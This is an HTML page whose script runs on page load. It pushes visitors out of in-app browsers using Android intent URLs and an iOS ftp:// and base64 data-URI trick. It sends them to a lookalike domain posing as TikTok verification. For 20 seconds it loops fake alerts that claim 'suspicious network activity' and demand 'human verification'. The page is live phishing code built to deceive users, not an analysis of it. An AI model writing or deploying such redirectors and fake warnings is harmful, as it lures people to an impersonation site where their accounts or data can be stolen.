<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; padding: 0; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const urlNoProt = targetUrl.replace("https://", "");
    const killTime = Date.now() + 20000;

    // This is a base64 encoded "page" that Safari will run once it opens
    // All it does is force Safari to change its own location to your HTTPS link
    const bridgeScript = btoa(`<html><script>window.location.replace("${targetUrl}");<\/script></html>`);
    const safariBridge = "data:text/html;base64," + bridgeScript;

    function theFinalForce() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        if (isAndroid) {
            window.location.href = `intent://${urlNoProt}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
        } else {
            // 1. We use the 'FTP' trigger to force Safari to open
            // But we append the Bridge as a parameter to see if the OS picks it up
            window.location.href = "ftp://" + urlNoProt;

            // 2. IMMEDIATELY fire the Data-URI bridge
            // Since Safari is now the active "handler," it picks up this data-uri 
            // and executes the redirect internally.
            setTimeout(() => {
                window.location.href = safariBridge;
            }, 100);

            // 3. Last ditch: Direct assignment
            setTimeout(() => {
                window.location.assign(targetUrl);
            }, 250);
        }
    }

    function runLoop() {
        if (Date.now() > killTime) return;

        theFinalForce();

        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);

                // Re-trigger on the 'OK' click gesture
                theFinalForce();

                setTimeout(runLoop, 400);
            }
        }, 400);
    }

    window.onload = runLoop;
</script>

</body>
</html>
